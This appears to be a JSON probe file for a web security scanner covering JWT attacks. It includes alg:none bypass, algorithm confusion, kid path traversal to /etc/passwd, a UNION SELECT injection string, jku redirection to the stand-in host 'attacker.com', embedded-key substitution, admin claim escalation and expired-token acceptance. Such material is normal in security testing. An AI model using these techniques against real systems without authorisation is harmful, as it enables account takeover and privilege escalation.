{
  "category": "jwt",
  "contexts": {
    "alg_none": {
      "description": "JWT algorithm none bypass — strip signature",
      "tech_match": [],
      "param_match": ["token", "jwt", "auth", "authorization", "access_token", "id_token"],
      "probes": [
        {
          "payload": "{{baseline}}",
          "description": "Test if server accepts JWT with alg:none (modify header to {\"alg\":\"none\"}, remove signature)",
          "matchers": [{"type": "status", "status": [200]}, {"type": "not_word", "words": ["invalid", "expired", "unauthorized", "denied"]}],
          "severity": "critical",
          "confidence_boost": 50
        }
      ]
    },
    "alg_confusion": {
      "description": "JWT RS256 to HS256 algorithm confusion",
      "tech_match": [],
      "param_match": ["token", "jwt", "auth", "authorization"],
      "probes": [
        {
          "payload": "{{baseline}}",
          "description": "Change RS256 to HS256, sign with public key as HMAC secret",
          "matchers": [{"type": "status", "status": [200]}, {"type": "not_word", "words": ["invalid", "expired", "unauthorized"]}],
          "severity": "critical",
          "confidence_boost": 50
        }
      ]
    },
    "kid_injection": {
      "description": "JWT kid parameter injection (path traversal / SQLi)",
      "tech_match": [],
      "param_match": ["token", "jwt", "auth"],
      "probes": [
        {
          "payload": "{{baseline}}",
          "description": "kid: ../../etc/passwd — path traversal in key lookup",
          "matchers": [{"type": "word", "words": ["root:x:0", "root:"], "condition": "or"}],
          "severity": "critical",
          "confidence_boost": 50
        },
        {
          "payload": "{{baseline}}",
          "description": "kid: ' UNION SELECT 'key'-- — SQLi in key ID lookup",
          "matchers": [{"type": "status", "status": [200]}, {"type": "not_word", "words": ["invalid", "unauthorized"]}],
          "severity": "critical",
          "confidence_boost": 45
        }
      ]
    },
    "jku_injection": {
      "description": "JWT jku/x5u header injection — attacker-controlled key URL",
      "tech_match": [],
      "param_match": ["token", "jwt", "auth"],
      "probes": [
        {
          "payload": "{{baseline}}",
          "description": "jku: https://{{callback}}/jwks.json — SSRF via key URL",
          "matchers": [{"type": "status", "status": [200]}],
          "severity": "critical",
          "confidence_boost": 50,
          "variables": {"callback": "attacker.com"}
        }
      ]
    },
    "weak_secret": {
      "description": "JWT signed with weak/common secrets",
      "tech_match": [],
      "param_match": ["token", "jwt", "auth", "authorization"],
      "probes": [
        {
          "payload": "{{baseline}}",
          "description": "Try common JWT secrets: secret, password, 123456, changeme, key",
          "matchers": [{"type": "status", "status": [200]}, {"type": "not_word", "words": ["invalid", "unauthorized"]}],
          "severity": "high",
          "confidence_boost": 40
        }
      ]
    },
    "embedded_jwk": {
      "description": "JWT embedded JWK attack — attacker embeds own public key in JWT header",
      "tech_match": [],
      "param_match": ["token", "jwt", "auth", "authorization", "access_token"],
      "probes": [
        {
          "payload": "{{baseline}}",
          "description": "JWT with jwk header containing attacker-generated RSA public key — server may verify with the embedded key instead of server key",
          "matchers": [{"type": "status", "status": [200]}, {"type": "not_word", "words": ["invalid", "unauthorized", "rejected"]}],
          "severity": "critical",
          "confidence_boost": 50,
          "variables": {"attack_type": "embedded_jwk", "note": "Generate RSA key pair, sign JWT with private key, embed public key in jwk header"}
        }
      ]
    },
    "x5c_injection": {
      "description": "JWT x5c header injection — embed self-signed certificate chain",
      "tech_match": [],
      "param_match": ["token", "jwt", "auth", "authorization"],
      "probes": [
        {
          "payload": "{{baseline}}",
          "description": "JWT with x5c header containing attacker's self-signed certificate — server may use embedded cert for verification",
          "matchers": [{"type": "status", "status": [200]}, {"type": "not_word", "words": ["invalid", "unauthorized", "rejected"]}],
          "severity": "critical",
          "confidence_boost": 45,
          "variables": {"attack_type": "x5c_injection", "note": "Create self-signed cert, sign JWT with corresponding private key, set x5c to cert chain"}
        }
      ]
    },
    "claim_manipulation": {
      "description": "JWT claim manipulation — modify role, sub, or admin claims to escalate privileges",
      "tech_match": [],
      "param_match": ["token", "jwt", "auth", "authorization", "access_token"],
      "probes": [
        {
          "payload": "{{baseline}}",
          "description": "Change role claim from 'user' to 'admin' — re-sign or use with alg:none",
          "matchers": [{"type": "status", "status": [200]}, {"type": "not_word", "words": ["unauthorized", "forbidden", "denied"]}],
          "severity": "critical",
          "confidence_boost": 50,
          "variables": {"claim": "role", "original_value": "user", "modified_value": "admin"}
        },
        {
          "payload": "{{baseline}}",
          "description": "Change sub claim from 'user1' to 'admin' — IDOR via JWT subject manipulation",
          "matchers": [{"type": "status", "status": [200]}, {"type": "not_word", "words": ["unauthorized", "forbidden"]}],
          "severity": "critical",
          "confidence_boost": 50,
          "variables": {"claim": "sub", "original_value": "user1", "modified_value": "admin"}
        }
      ]
    },
    "expired_token": {
      "description": "Expired JWT acceptance — server does not validate exp claim",
      "tech_match": [],
      "param_match": ["token", "jwt", "auth", "authorization", "access_token"],
      "probes": [
        {
          "payload": "{{baseline}}",
          "description": "Send JWT with exp set in the past (e.g., epoch 1) — server should reject but may not validate expiry",
          "matchers": [{"type": "status", "status": [200]}, {"type": "not_word", "words": ["expired", "invalid", "token expired"]}],
          "severity": "high",
          "confidence_boost": 40,
          "variables": {"claim": "exp", "modified_value": 1}
        }
      ]
    }
  }
}
